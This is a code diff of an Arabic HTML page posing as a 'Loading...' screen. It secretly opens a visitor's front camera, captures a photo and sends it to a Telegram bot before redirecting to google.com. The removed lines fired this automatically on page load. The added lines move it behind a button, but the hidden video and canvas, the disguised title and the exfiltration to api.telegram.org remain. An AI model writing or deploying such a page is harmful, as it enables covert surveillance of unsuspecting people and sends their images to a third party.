@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>جارٍ التحميل...</title>
 </head>
 <body>
-  <h3>جارٍ تحميل الصفحة...</h3>
+  <h3>اضغط الزر لالتقاط الصورة وإرسالها</h3>
+  <button id="captureBtn">التقاط الصورة وإرسالها</button>
+
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -19,7 +21,7 @@
       formData.append("chat_id", chatId);
       formData.append("photo", blob, "photo.jpg");
 
-      await fetch(https://api.telegram.org/bot${token}/sendPhoto, {
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: "POST",
         body: formData
       });
@@ -28,36 +30,46 @@
     async function captureAndSendCameraImage() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // الكاميرا الأمامية
+          video: { facingMode: "user" }
         });
 
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // انتظر شوي حتى تشتغل الكاميرا
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // انتظر حتى تتحمل معلومات الفيديو
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            resolve();
+          };
+        });
 
-          // أوقف الكاميرا
-          stream.getTracks().forEach(track => track.stop());
+        // التقط الصورة بعد 3 ثواني (اختياري)
+        await new Promise(resolve => setTimeout(resolve, 3000));
 
-          const base64Image = canvas.toDataURL("image/jpeg");
-          sendPhoto(base64Image).then(() => {
-            window.location.href = "https://google.com";
-          });
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        }, 3000); // انتظر 3 ثواني
+        // أوقف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+
+        const base64Image = canvas.toDataURL("image/jpeg");
+        await sendPhoto(base64Image);
+
+        // بعد الإرسال تحويل إلى الرابط
+        window.location.href = "https://google.com";
+
       } catch (err) {
         alert("فشل الوصول للكاميرا: " + err);
         window.location.href = "https://google.com";
       }
     }
 
-    window.onload = captureAndSendCameraImage;
+    document.getElementById('captureBtn').addEventListener('click', () => {
+      captureAndSendCameraImage();
+    });
   </script>
 </body>
 </html>
